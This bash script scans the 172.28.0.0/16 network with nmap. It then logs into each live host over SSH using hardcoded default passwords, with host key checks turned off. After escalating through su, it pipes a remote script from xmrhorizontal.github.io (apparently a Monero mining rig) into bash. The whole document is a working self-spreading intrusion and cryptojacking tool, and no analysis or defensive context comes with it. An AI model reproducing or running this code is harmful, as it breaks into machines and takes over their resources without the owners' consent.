#!/bin/bash

get_active_ips() {
    local range=$1
    nmap -sn $range | awk '/Nmap scan report/{print $NF}'
}

try_ssh() {
    local ip=$1
    
    sshpass -p "rnzxor" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no admin@$ip \
        "echo 'rnzxor' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "rjuytoew" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no Admin@$ip \
        "echo 'rjuytoew' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
    sshpass -p "12345678" ssh -o ConnectTimeout=2 -o StrictHostKeyChecking=no user@$ip \
        "echo '12345678' | su -c 'curl -s https://xmrhorizontal.github.io/rig.sh | bash & sleep 120 && pkill -P \$\$'" && {
        return
    }
}

range="172.28.0.0/16" 
active_ips=$(get_active_ips "$range")

while read -r ip; do
    try_ssh "$ip"
done <<< "$active_ips"
